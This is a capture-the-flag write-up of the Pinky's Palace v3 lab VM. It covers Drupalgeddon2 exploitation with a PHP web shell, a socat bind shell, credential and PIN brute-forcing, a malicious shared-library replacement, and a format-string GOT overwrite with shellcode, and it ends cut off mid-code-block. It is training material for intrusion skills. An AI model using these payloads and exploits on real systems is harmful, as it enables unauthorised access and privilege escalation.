---
layout: post
title:  "Pinky's Palace v3 Writeup"
date:   2018-05-28 01:00:00 +0100
categories: [pinky]
description: ""
image:
  feature: pinkyv3.jpg
  credit:
---

A rather different one from the usual, as in this writeup I'll be tackling [Pinky's Palace v3](https://pinkysplanet.net/pinkys-palacev3/) by [@Pink_Panther](https://twitter.com/@Pink_P4nther).  This is probably at around the Intermediate/Hard level, and it teaches some very important things about the way in which you approach your enumeration methodology (one which caught me out for a couple of days and required a nudge to move forward).  

I haven't done levels 0-2 but considering the difficulty of some of these challenges, but I imagine they'd be good introductions to some of the concepts here.  If you're stuck on some of the concepts here then check out the previous versions.

Without further ado, let's put on some [tunes](https://www.youtube.com/watch?v=S4g7mPUskW8) and begin!
  
Enumeration  
-----------  
```
PORT STATE SERVICE VERSION  
21/tcp open ftp vsftpd 2.0.8 or later  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
|_-rw-r--r-- 1 0 0 173 May 14 17:37 WELCOME  
| ftp-syst:  
| STAT:  
| FTP server status:  
| Connected to ::ffff:157.203.11.96  
| Logged in as ftp  
| TYPE: ASCII  
| No session bandwidth limit  
| Session timeout in seconds is 300  
| Control connection is plain text  
| Data connections will be plain text  
| At session startup, client count was 1  
| vsFTPd 3.0.3 - secure, fast, stable  
|_End of status  
5555/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)  
| ssh-hostkey:  
| 2048 80:52:6e:bd:b0:c4:be:0a:f2:1d:3b:ac:b8:47:4f:ee (RSA)  
| 256 eb:c8:76:a4:cf:37:6f:0d:5f:f5:48:af:5c:29:92:d9 (ECDSA)  
|_ 256 48:2b:84:02:3e:87:7b:2a:f3:91:11:31:0f:98:11:c7 (ED25519)  
8000/tcp open http nginx 1.10.3  
|_http-generator: Drupal 7 (http://drupal.org)  
| http-robots.txt: 36 disallowed entries (15 shown)  
| /includes/ /misc/ /modules/ /profiles/ /scripts/  
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt  
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt  
|_/LICENSE.txt /MAINTAINERS.txt  
|_http-server-header: nginx/1.10.3  
|_http-title: PinkDrup  
```  
  
Three interesting ports open. First stop we'll go for the FTP port.  
  
```bash
root@kali:~# pftp 157.203.11.95  
Connected to 157.203.11.95.  
220 Pinky's FTP  
Name (157.203.11.95:root): anonymous  
331 Please specify the password.  
Password:  
230 Login successful.  
Remote system type is UNIX.  
Using binary mode to transfer files.  
ftp> ls  
227 Entering Passive Mode (157,203,11,95,200,14).  
150 Here comes the directory listing.  
-rw-r--r-- 1 0 0 173 May 14 17:37 WELCOME  
226 Directory send OK.  
ftp> get WELCOME  
local: WELCOME remote: WELCOME  
227 Entering Passive Mode (157,203,11,95,65,134).  
150 Opening BINARY mode data connection for WELCOME (173 bytes).  
226 Transfer complete.  
173 bytes received in 0.00 secs (1.6499 MB/s)  
ftp> exit  
221 Goodbye.  
root@kali:~# cat WELCOME  
Welcome to Pinky's Palace V3  
  
Good Luck ;}  
  
I encourage you to be creative, try and stay away from metasploit and pre-made tools.  
You will learn much more this way!  
  
~Pinky  
```   

Next stop, let's check out the HTTP page.  ![](https://image.ibb.co/ixnFSd/pinkdrup.png)
 
So a basic Drupal installation.  If we remember back to February of this year, Drupal had a pretty nasty security bug known as [Drupalgeddon 2](https://www.drupal.org/sa-core-2018-002), which allowed full code execution on almost all Drupal installations.  It says it affects versions <7.58, so let's check `CHANGELOG.txt` to see what version this is.
```
Drupal 7.57, 2018-02-21
-----------------------
- Fixed security issues (multiple vulnerabilities). See SA-CORE-2018-001.
```
Noice!  We'll use [this PoC](https://github.com/dreadlocked/Drupalgeddon2)  to get a shell.

```bash
root@kali:~/panther/Drupalgeddon2# ruby drupalgeddon2.rb http://192.168.0.74:8000  
[*] --==[::#Drupalggedon2::]==--  
--------------------------------------------------------------------------------  
[i] Target : http://192.168.0.74:8000/  
--------------------------------------------------------------------------------  
[+] Found : http://192.168.0.74:8000/CHANGELOG.txt (HTTP Response: 200)  
[+] Drupal!: v7.57  
--------------------------------------------------------------------------------  
[*] Testing: Code Execution  
[i] Payload: echo VKSVGCTH  
[+] Result : VKSVGCTH  
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!  
--------------------------------------------------------------------------------  
[*] Testing: Writing To Web Root (./)  
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee s.php  
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }  
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!  
--------------------------------------------------------------------------------  
[i] Fake shell: curl 'http://192.168.0.74:8000/s.php' -d 'c=hostname'  
pinkys-palace>> id  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
```  

www-data  
--------- 
After some basic enumeration, I tried to grab some files from my local box using the shell.  For some reason however, I couldn't get a connection.  A quick gander at the firewall rules reveals that outbound connections are blocked.
```bash  
pinkys-palace>> cat /etc/iptables/rules.v4  
# Generated by iptables-save v1.6.0 on Tue May 15 02:46:06 2018  
*filter  
:INPUT ACCEPT [714:49326]  
:FORWARD ACCEPT [0:0]  
:OUTPUT ACCEPT [442:57902]  
-A OUTPUT -o eth0 -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG SYN -m state --state NEW -j DROP  
COMMIT  
# Completed on Tue May 15 02:46:06 2018  
```  

This doesn't exclude incoming connections however, so we can just create a bind shell.  You'll see netcat is surprisingly missing, but socat's installed so no worries!  The following command creates a bind shell on port 1337:
```bash  
socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane  
```  
  
We then connect to it with:
```bash  
root@kali:~/panther# socat FILE:`tty`,raw,echo=0 TCP:192.168.0.74:1337  
www-data@pinkys-palace:~/html$ id  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
```  

Some more enumeration reveals that the internal ports are exposing more than we saw externally.  Notably, port 80 and port 65334.

```bash  
www-data@pinkys-palace:~/html$ netstat -tulpn  
(Not all processes could be identified, non-owned process info  
will not be shown, you would have to be root to see it all.)  
Active Internet connections (only servers)  
Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name  
tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN -  
tcp 0 0 127.0.0.1:80 0.0.0.0:* LISTEN -  
tcp 0 0 0.0.0.0:5555 0.0.0.0:* LISTEN -  
tcp 0 0 127.0.0.1:65334 0.0.0.0:* LISTEN -  
tcp 0 0 0.0.0.0:1337 0.0.0.0:* LISTEN 854/socat  
tcp 0 0 0.0.0.0:8000 0.0.0.0:* LISTEN 520/nginx: worker p  
tcp6 0 0 :::80 :::* LISTEN 520/nginx: worker p  
tcp6 0 0 :::5555 :::* LISTEN -  
tcp6 0 0 :::21 :::* LISTEN -  
udp 0 0 0.0.0.0:68 0.0.0.0:* -  
```  
This can't be an nginx process, as we control that service, and a quick check of the config excludes it also.  However, it looks like apache2 is installed and running.  We'll dump the `000-default.conf` to see what's exposed.

```xml  
www-data@pinkys-palace:/etc/apache2/sites-enabled$ cat 000-default.conf  
<VirtualHost 127.0.0.1:80>  
# The ServerName directive sets the request scheme, hostname and port that  
# the server uses to identify itself. This is used when creating  
# redirection URLs. In the context of virtual hosts, the ServerName  
# specifies what hostname must appear in the request's Host: header to  
# match this virtual host. For the default virtual host (this file) this  
# value is not decisive as it is used as a last resort host regardless.  
# However, you must set it for any further virtual host explicitly.  
#ServerName www.example.com  
  
ServerAdmin pinkyadmin@localhost  
DocumentRoot /home/pinksec/html  
<Directory "/home/pinksec/html">  
Order allow,deny  
Allow from all  
Require all granted  
</Directory>  
# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,  
# error, crit, alert, emerg.  
# It is also possible to configure the loglevel for particular  
# modules, e.g.  
#LogLevel info ssl:warn  
  
ErrorLog ${APACHE_LOG_DIR}/error.log  
CustomLog ${APACHE_LOG_DIR}/access.log combined  
  
# For most configuration files from conf-available/, which are  
# enabled or disabled at a global level, it is possible to  
# include a line for only one particular virtual host. For example the  
# following line enables the CGI configuration for this host only  
# after it has been globally disabled with "a2disconf".  
#Include conf-available/serve-cgi-bin.conf  
</VirtualHost>  
<VirtualHost 127.0.0.1:65334>  
DocumentRoot /home/pinksec/database  
ServerAdmin pinkyadmin@localhost  
<Directory "/home/pinksec/database">  
Order allow,deny  
Allow from all  
Require all granted  
</Directory>  
</VirtualHost>  
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet  
```
These look like they're worth an investigation.
  
For this we'll just create two socat tunnels which we'll bind externally. This way we can access the internal ports from our Kali machine.  
  
```bash  
socat TCP-LISTEN:8080,fork,reuseaddr TCP:127.0.0.1:80  
socat TCP-LISTEN:8085,fork,reuseaddr TCP:127.0.0.1:65334  
```  
On port 80, we see a login app, with a PIN, which is going to make brute-forcing a bit of a pain.
![](https://image.ibb.co/jAawYJ/webpage1.png)

On port 65334, there's not much but a notice that a database is 'Under Development'!

![](https://image.ibb.co/bEfr0y/webpage2.png)

This could be worth an enum as perhaps the administrator has left database files lying around in this webroot.  This part truthfully had me stumped for a while, as  the standard wordlists yielded nothing.  Thankfully I was told that this was the route in.  A blind brute-force of every combination of 3-5 characters does yield a result.

```bash  
root@kali:~/panther# crunch 3 5 -f /usr/share/crunch/charset.lst lalpha -o dbcrunch.txt  
Crunch will now generate the following amount of data: 73643440 bytes  
70 MB  
0 GB  
0 TB  
0 PB  
Crunch will now generate the following number of lines: 12355928  
  
crunch: 100% completed generating output  
root@kali:/usr/share/seclists# gobuster -u http://192.168.0.74:8085 -w /root/panther/dbcrunch.txt -x db  
  
Gobuster v1.4.1 OJ Reeves (@TheColonial)  
=====================================================  
=====================================================  
[+] Mode : dir  
[+] Url/Domain : http://192.168.0.74:8085/  
[+] Threads : 10  
[+] Wordlist : /root/panther/dbcrunch.txt  
[+] Status codes : 301,302,307,200,204  
[+] Extensions : .db  
=====================================================  
/pwds.db (Status: 200)  
root@kali:/usr/share/seclists# curl http://192.168.0.74:8085/pwds.db  
FJ(J#J(R#J  
JIOJoiejwo  
JF()#)PJWEOFJ  
Jewjfwej  
jvmr9e  
uje9fu  
wjffkowko  
ewufweju  
pinkyspass  
consoleadmin  
administrator  
admin  
P1nK135Pass  
AaPinkSecaAdmin4467  
password4P1nky  
Bbpinksecadmin9987  
pinkysconsoleadmin  
pinksec133754  
```
So we've got some passwords, but we don't just want to brute-force every combinations of usernames, passwords, and PIN's.  That'd take way too long (around 10-12 hours I think was my estimate doing a quick trial run).

We collect a list of usernames from across the exposed web-pages and in the site and just run a quick test with a dummy PIN value.  The hope is that some difference in response will be yielded on incorrect PIN but correct credentials.

```bash
root@kali:~/panther# cat usernames.txt 
pinksec
pinkadmin
pinksecmanagement
pinky
dpink
```
  
```bash
root@kali:~/panther# wfuzz -c -z file,./usernames.txt -z file,./pwds.db -d 'user=FUZZ&pass=FUZ2Z&pin=12345' --hh 45 http://192.168.0.74:8080/login.php  
  
Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.  
  
********************************************************  
* Wfuzz 2.2.9 - The Web Fuzzer *  
********************************************************  
  
Target: http://192.168.0.74:8080/login.php  
Total requests: 90  
  
==================================================================  
ID Response Lines Word Chars Payload  
==================================================================  
  
000032: C=200 0 L 6 W 41 Ch "pinkadmin - AaPinkSecaAdmin4467"  
  
Total time: 0.399415  
Processed Requests: 90  
Filtered Requests: 89  
Requests/sec.: 225.3289  
```  
Lo and Behold, we have credentials!  Now we just need to brute-force the PIN. 
```bash
root@kali:~/panther# crunch 5 5 -f /usr/share/crunch/charset.lst numeric -o pin.txt  
Crunch will now generate the following amount of data: 600000 bytes  
0 MB  
0 GB  
0 TB  
0 PB  
Crunch will now generate the following number of lines: 100000  
  
crunch: 100% completed generating output  
root@kali:~/panther# wfuzz -c -z file,./pin.txt -d 'user=pinkadmin&pass=AaPinkSecaAdmin4467&pin=FUZZ' --hh 45,41 http://192.168.0.74:8080/login.php  
  
Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.  
  
********************************************************  
* Wfuzz 2.2.9 - The Web Fuzzer *  
********************************************************  
  
Target: http://192.168.0.74:8080/login.php  
Total requests: 100000  
  
==================================================================  
ID Response Lines Word Chars Payload  
==================================================================  
  
055850: C=302 0 L 0 W 0 Ch "55849"  
  
Total time: 299.6173  
Processed Requests: 100000  
Filtered Requests: 99999  
Requests/sec.: 333.7590  
```

We log in with these three and find a control panel which lets us execute code fully as the `pinksec` user.

![](https://image.ibb.co/eeBOfy/webpage3.png)

In this case I just generate an SSH key and write it into the authorized_keys file, allowing me to SSH straight in!

pinksec  
-------  
```bash  
root@kali:~/panther# ssh -p 5555 pinksec@192.168.0.74 -i id_rsa  
Linux pinkys-palace 4.9.0-6-686 #1 SMP Debian 4.9.82-1+deb9u3 (2018-03-02) i686  
  
The programs included with the Debian GNU/Linux system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.  
  
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent  
permitted by applicable law.  
pinksec@pinkys-palace:~$  
```  

Enumeration reveals some interesting SUID files.  We can run `pinksecd` which might allow us to elevate to `pinksecmanagement`.

```bash  
[-] SUID files:  
-rwsr-xr-x 1 root root 78340 May 17 2017 /usr/bin/gpasswd  
-rwsr-xr-x 1 root root 48560 May 17 2017 /usr/bin/chfn  
-rwsr-xr-x 1 root root 57972 May 17 2017 /usr/bin/passwd  
-rwsr-xr-x 1 root root 39632 May 17 2017 /usr/bin/chsh  
-rwsr-xr-x 1 root root 163988 Jun 5 2017 /usr/bin/sudo  
-rwsr-xr-x 1 root root 34920 May 17 2017 /usr/bin/newgrp  
-rwsrwx--- 1 pinky pinksecmanagement 7396 May 14 19:06 /usr/local/bin/PSMCCLI  
-rwsr-xr-- 1 root messagebus 46436 Mar 2 00:59 /usr/lib/dbus-1.0/dbus-daemon-launch-helper  
-rwsr-xr-x 1 root root 5480 Mar 27 2017 /usr/lib/eject/dmcrypt-get-device  
-rwsr-xr-x 1 root root 525932 Mar 1 07:17 /usr/lib/openssh/ssh-keysign  
-rwsr-xr-x 1 pinksecmanagement pinksecmanagement 7508 May 13 23:10 /home/pinksec/bin/pinksecd  
-rwsr-xr-x 1 root root 26504 Mar 7 10:29 /bin/umount  
-rwsr-xr-x 1 root root 39144 May 17 2017 /bin/su  
-rwsr-xr-x 1 root root 68076 Nov 9 2016 /bin/ping  
-rwsr-xr-x 1 root root 38940 Mar 7 10:29 /bin/mount  
```  
Running it with some standard inputs doesn't appear to yield much however.
```bash  
pinksec@pinkys-palace:/tmp$ /home/pinksec/bin/pinksecd  
[+] PinkSec Daemon [+]  
Options: -d: daemonize, -h: help  
Soon to be host of pinksec web application.  
pinksec@pinkys-palace:/tmp$ /home/pinksec/bin/pinksecd -h  
[+] PinkSec Daemon [+]  
Options: -d: daemonize, -h: help  
Flags Added: -h  
Soon to be host of pinksec web application.  
pinksec@pinkys-palace:/tmp$ /home/pinksec/bin/pinksecd -d  
[+] PinkSec Daemon [+]  
Options: -d: daemonize, -h: help  
Flags Added: -d  
Soon to be host of pinksec web application.  
```  

Looking at the disassembly reveals that what it's printing is in fact the result of some functions within the plt, indicating that there's a shared library actually containing these functions.
```gdb
pwndbg> disass main  
Dump of assembler code for function main:  
0x000006d0 <+0>: lea ecx,[esp+0x4]  
0x000006d4 <+4>: and esp,0xfffffff0  
0x000006d7 <+7>: push DWORD PTR [ecx-0x4]  
0x000006da <+10>: push ebp  
0x000006db <+11>: mov ebp,esp  
0x000006dd <+13>: push esi  
0x000006de <+14>: push ebx  
0x000006df <+15>: push ecx  
0x000006e0 <+16>: sub esp,0xc  
0x000006e3 <+19>: call 0x5a0 <__x86.get_pc_thunk.bx>  
0x000006e8 <+24>: add ebx,0x1918  
0x000006ee <+30>: mov esi,ecx  
0x000006f0 <+32>: call 0x500 <psbanner@plt>  
0x000006f5 <+37>: call 0x510 <psopt@plt>  
0x000006fa <+42>: cmp DWORD PTR [esi],0x2  
0x000006fd <+45>: jne 0x713 <main+67>  
0x000006ff <+47>: mov eax,DWORD PTR [esi+0x4]  
0x00000702 <+50>: add eax,0x4  
0x00000705 <+53>: mov eax,DWORD PTR [eax]  
0x00000707 <+55>: sub esp,0xc  
0x0000070a <+58>: push eax  
0x0000070b <+59>: call 0x540 <psoptin@plt>  
0x00000710 <+64>: add esp,0x10  
0x00000713 <+67>: sub esp,0xc  
0x00000716 <+70>: lea eax,[ebx-0x1840]  
0x0000071c <+76>: push eax  
0x0000071d <+77>: call 0x520 <puts@plt>  
0x00000722 <+82>: add esp,0x10  
0x00000725 <+85>: mov eax,0x0  
0x0000072a <+90>: lea esp,[ebp-0xc]  
0x0000072d <+93>: pop ecx  
0x0000072e <+94>: pop ebx  
0x0000072f <+95>: pop esi  
0x00000730 <+96>: pop ebp  
0x00000731 <+97>: lea esp,[ecx-0x4]  
0x00000734 <+100>: ret  
End of assembler dump.  
```  
Let's see what this binary links:
```bash  
pinksec@pinkys-palace:/tmp$ ldd /home/pinksec/bin/pinksecd  
linux-gate.so.1 (0xb7fd9000)  
libpinksec.so => /lib/libpinksec.so (0xb7fc8000)  
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e11000)  
/lib/ld-linux.so.2 (0xb7fdb000)  
```  
  
/lib/libpinksec.so looks promising!  Just to confirm we have the correct library: 
```gdb
pwndbg> info symbol psoptin  
psoptin in section .text of /lib/libpinksec.so  
```  
If we find the library itself, we see it's world-writeable, so we can just replace it with a malicious copy and then run the binary to elevate our privileges.
```bash
pinksec@pinkys-palace:/tmp$ ls -la /lib/libpinksec.so  
-rwxrwxrwx 1 root root 7136 May 14 23:52 /lib/libpinksec.so  
```
I used the following code to export the same functions:
```c  
#include <stdio.h>  
#include <stdlib.h>  
#include <unistd.h>  
int psbanner()  
{  
setreuid(1002, 1002);  
printf("ID: %d\n", geteuid());  
execve("/bin/sh", NULL, NULL);  
}  
  
int psopt()  
{  
setreuid(1002, 1002);  
printf("ID: %d\n", geteuid());  
execve("/bin/sh", NULL, NULL);  
}  
  
int psoptin()  
{  
setreuid(1002, 1002);  
printf("ID: %d\n", geteuid());  
execve("/bin/sh", NULL, NULL);  
}  
  
```  
  Compiled it using the following:
```bash 
pinksec@pinkys-palace:/tmp$ gcc -c -fpic evillibpinksec.c  
pinksec@pinkys-palace:/tmp$ gcc -shared -o evillibpinksec.so evillibpinksec.o  
cp ./evillibpinksec.so /lib/libpinksec.so  
```  

```bash
pinksec@pinkys-palace:/tmp$ /home/pinksec/bin/pinksecd  
ID: 1002  
$ id  
uid=1002(pinksecmanagement) gid=1001(pinksec) groups=1001(pinksec)  
```  
 Boom! A shell!
 
pinksecmanagement  
-----------------  
```bash  
root@kali:~/panther# ssh -p 5555 pinksecmanagement@192.168.0.74 -i id_rsa  
Linux pinkys-palace 4.9.0-6-686 #1 SMP Debian 4.9.82-1+deb9u3 (2018-03-02) i686  
  
The programs included with the Debian GNU/Linux system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.  
  
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent  
permitted by applicable law.  
pinksecmanagement@pinkys-palace:~$  
```  
Now we have the other SUID file worth investigating as we're now `pinksecmanagement`.
```bash
-rwsrwx--- 1 pinky pinksecmanagement 7396 May 14 19:06 /usr/local/bin/PSMCCLI  
```  
Fuzzing reveals it echos out our arguments, so a classic format string vulnerability.
```bash  
pinksecmanagement@pinkys-palace:~$ /usr/local/bin/PSMCCLI  
[+] Pink Sec Management Console CLI  
pinksecmanagement@pinkys-palace:~$ /usr/local/bin/PSMCCLI 1  
[+] Args: 1  
pinksecmanagement@pinkys-palace:~$ /usr/local/bin/PSMCCLI %x  
[+] Args: bffff744  
```  
I'm not going to go into the theory too deeply, but if you're new to these Code Arcana's [Introduction to format string exploits](http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html) is probably the best resource.

As a quick aside, I'm not a fan of doing these things blind, as debugging inside and outside GDB is a pain in the arse.  All commands as well as debugging therefore, takes place using the invoke script from [this stack-overflow answer](https://stackoverflow.com/a/17775966).  In this I will be using a mixture of local disassembly, and debugging remotely using a [static gdb binary](https://github.com/hugsy/gdb-static).

Firstly, the disassembly shows that a functions called `argshow` is called within `main`.  
  
```bash
0x0804852b <+71>: call 0x804849b <argshow>  
```  
Disassembly doesn't show much interesting, it's the classic format string pwnable.
```gdb
pwndbg> disass argshow  
Dump of assembler code for function argshow:  
0x0804849b <+0>: push ebp  
0x0804849c <+1>: mov ebp,esp  
0x0804849e <+3>: push ebx  
0x0804849f <+4>: sub esp,0x4  
0x080484a2 <+7>: call 0x80483d0 <__x86.get_pc_thunk.bx>  
0x080484a7 <+12>: add ebx,0x1b59  
0x080484ad <+18>: sub esp,0xc  
0x080484b0 <+21>: lea eax,[ebx-0x1a30]  
0x080484b6 <+27>: push eax  
0x080484b7 <+28>: call 0x8048340 <printf@plt>  
0x080484bc <+33>: add esp,0x10  
0x080484bf <+36>: sub esp,0xc  
0x080484c2 <+39>: push DWORD PTR [ebp+0x8]  
0x080484c5 <+42>: call 0x8048340 <printf@plt>  
0x080484ca <+47>: add esp,0x10  
0x080484cd <+50>: sub esp,0xc  
0x080484d0 <+53>: push 0xa  
0x080484d2 <+55>: call 0x8048380 <putchar@plt>  
0x080484d7 <+60>: add esp,0x10  
0x080484da <+63>: sub esp,0xc  
0x080484dd <+66>: push 0x0  
0x080484df <+68>: call 0x8048360 <exit@plt>  
End of assembler dump.  
```  

Running `checksec` locally reveals that almost all protections are disabled, so a  classic GOT overwrite into shellcode exploit will work!
```gdb
pwndbg> checksec  
[*] '/root/panther/PSMCCLI'  
Arch: i386-32-little  
RELRO: Partial RELRO  
Stack: No canary found  
NX: NX disabled  
PIE: No PIE (0x8048000)  
RWX: Has RWX segments  
```  

Again, just to reiterate, so I ran all gdb debugging through the above invoke script to keep stack offsets equal.

We'll use the following template for writing two half-words to a target address.  In this case we need to find the offsets at which `0x41414141` and `0x42424242` are displayed.  I also included a nopsled which will have shellcode placed on it during the final exploitation, as we want the stack to look as close to the final result as possible.  Since the stack grows upwards, this affects offsets.

```bash  
./invoke /usr/local/bin/PSMCCLI $(python -c 'import sys; sys.stdout.write("AAAABBBB%0000000x%132$0x%0000000x%133$0x"+"\x90"*1000)')  
```  

Adjusting the values reveals that they're at 119 and 120.  I decided to overwrite the `putchar` GOT entry, as it is called after `printf`:
```bash
root@kali:~/panther# rabin2 -R PSMCCLI  
[Relocations]  
vaddr=0x08049ffc paddr=0x00000ffc type=SET_32 __gmon_start__  
vaddr=0x0804a00c paddr=0x0000100c type=SET_32 printf  
vaddr=0x0804a010 paddr=0x00001010 type=SET_32 puts  
vaddr=0x0804a014 paddr=0x00001014 type=SET_32 exit  
vaddr=0x0804a018 paddr=0x00001018 type=SET_32 __libc_start_main  
vaddr=0x0804a01c paddr=0x0000101c type=SET_32 putchar  
  
6 relocations  
```  
This means we'll be writing to the address `0x0804a01c`.  As for what I'm writing there, we'll need to dump the stack to see.  

Creating a breakpoint allows us to view the stack and find the nopsled address.  We keep using the invoke script during these so memory offsets are equal.  The following are run on the remote machine:
```gdb
(gdb) break *argshow+55  
Breakpoint 1 at 0x80484d2  
(gdb) r $(python -c 'import sys; sys.stdout.write("AAAABBBB%0000000x%132$0x%0000000x%133$0x"+"\x90"*1000)')  
Starting program: /usr/local/bin/PSMCCLI $(python -c 'import sys; sys.stdout.write("AAAABBBB%0000000x%132$0x%0000000x%133$0x"+"\x90"*1000)')  
[+] Args: AAAABBBBbffffaa490909090b7ffed0090909090��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������  
Breakpoint 1, 0x080484d2 in argshow ()  
```  
```gdb  
(gdb) x/100gx $esp  
0xbffff9c0: 0xbffffaa40000000a 0x080484a7b7ffed00  
0xbffff9d0: 0x0000000000000000 0x08048530bffff9f8  
0xbffff9e0: 0xbffffaa4bffffb97 0x080484f8bffffab0  
0xbffff9f0: 0x00000000bffffa10 0xb7e2f28600000000  
0xbffffa00: 0xb7fca00000000002 0xb7e2f28600000000  
0xbffffa10: 0xbffffaa400000002 0x00000000bffffab0  
0xbffffa20: 0x0000000000000000 0xb7fffc0cb7fca000  
0xbffffa30: 0x00000000b7fff000 0xb7fca00000000002  
0xbffffa40: 0x670b46a800000000 0x000000005d1beab8  
0xbffffa50: 0x0000000000000000 0x080483a000000002  
0xbffffa60: 0xb7ff071000000000 0xb7fff000b7e2f199  
0xbffffa70: 0x080483a000000002 0x080483c100000000  
0xbffffa80: 0x00000002080484e4 0x08048550bffffaa4  
0xbffffa90: 0xb7feb070080485b0 0xb7fff920bffffa9c  
0xbffffaa0: 0xbffffb8000000002 0x00000000bffffb97  
0xbffffab0: 0xbfffffb4bfffffa8 0xbfffffdcbfffffc0  
0xbffffac0: 0x0000002000000000 0x00000021b7fd9cd0  
0xbffffad0: 0x00000010b7fd9000 0x000000060fabfbff  
0xbffffae0: 0x0000001100001000 0x0000000300000064  
0xbffffaf0: 0x0000000408048034 0x0000000500000020  
0xbffffb00: 0x0000000700000009 0x00000008b7fdb000  
0xbffffb10: 0x0000000900000000 0x0000000b080483a0  
0xbffffb20: 0x0000000c000003ea 0x0000000d000003ea  
0xbffffb30: 0x0000000e000003ea 0x00000017000003ea  
0xbffffb40: 0x0000001900000000 0x0000001fbffffb6b  
0xbffffb50: 0x0000000fbfffffe5 0x00000000bffffb7b  
0xbffffb60: 0x0000000000000000 0xb3e7f8a81b000000  
0xbffffb70: 0xa2c230e852ebcc7f 0x00363836696a2918  
0xbffffb80: 0x636f6c2f7273752f 0x502f6e69622f6c61  
0xbffffb90: 0x4100494c43434d53 0x2542424242414141  
0xbffffba0: 0x7830303030303030 0x2578302432333125  
0xbffffbb0: 0x7830303030303030 0x9078302433333125  
0xbffffbc0: 0x9090909090909090 0x9090909090909090  
0xbffffbd0: 0x9090909090909090 0x9090909090909090  
0xbffffbe0: 0x9090909090909090 0x9090909090909090  
0xbffffbf0: 0x9090909090909090 0x9090909090909090  
0xbffffc00: 0x9090909090909090 0x9090909090909090  
0xbffffc10: 0x9090909090909090 0x9090909090909090  
0xbffffc20: 0x9090909090909090 0x9090909090909090  
0xbffffc30: 0x9090909090909090 0x9090909090909090  
0xbffffc40: 0x9090909090909090 0x9090909090909090  
0xbffffc50: 0x9090909090909090 0x9090909090909090  
0xbffffc60: 0x9090909090909090 0x9090909090909090  
0xbffffc70: 0x9090909090909090 0x9090909090909090  
0xbffffc80: 0x9090909090909090 0x9090909090909090  
0xbffffc90: 0x9090909090909090 0x9090909090909090  
---Type <return> to continue, or q <return> to quit---  
0xbffffca0: 0x9090909090909090 0x9090909090909090  
0xbffffcb0: 0x9090909090909090 0x9090909090909090  
0xbffffcc0: 0x9090909090909090 0x9090909090909090  
0xbffffcd0: 0x9090909090909090 0x9090909090909090  
```  
We see that the address of the nopsled within the stack, so honestly, any address within it works fine but I ended up choosing `0xbffffc78`.  We write this in two instances to the address `0x0804a01c` which is our `putchar` GOT address.  Once `putchar` is called after `printf`, an address to our shellcode will be in the GOT and executed.
```bash  
./invoke /usr/local/bin/PSMCCLI $(python -c 'import sys; sys.stdout.write("\x1e\xa0\x04\x08\x1c\xa0\x04\x08%0049143x%119$hn%0015481x%120$hn"+"\x90"*961+"\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80")')  
```  
I've snipped out the printed junk data, but suffice to say we receive a shell!
```bash  
$ id  
uid=1000(pinky) gid=1002(pinksecmanagement) groups=1002(pinksecmanagement)  
```  
  
  
pinky  
-----  
```bash  
root@kali:~/panther# ssh -p 5555 pinky@192.168.0.74 -i id_rsa  
Linux pinkys-palace 4.9.0-6-686 #1 SMP Debian 4.9.82-1+deb9u3 (2018-03-02) i686  
  
The programs included with the Debian GNU/Linux system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.  
  
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent  
permitted by applicable law.  
Last login: Tue May 15 04:32:07 2018 from 172.19.19.251  
pinky@pinkys-palace:~$  
```  
We're almost at the finish line!  In the `pinky` user we find two sudo permissions. 
```bash
pinky@pinkys-palace:~$ sudo -l  
Matching Defaults entries for pinky on pinkys-palace:  
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
  
User pinky may run the following commands on pinkys-palace:  
(ALL) NOPASSWD: /sbin/insmod  
(ALL) NOPASSWD: /sbin/rmmod  
```  
These allow us to add and remove kernel modules, which obviously would give us full control of the kernel.  There are a tonne of rootkits out there that would enable you to get full system privileges, but something simple is much nicer.  There is a nice rootkit on (Pink Panther's github)[https://github.com/PinkP4nther/Pinkit], which I shamelessly stole but made a small alteration.  Instead of tcp shell, I just made it give SUID permissions to a custom program which spawns `/bin/bash`.
  
```bash  
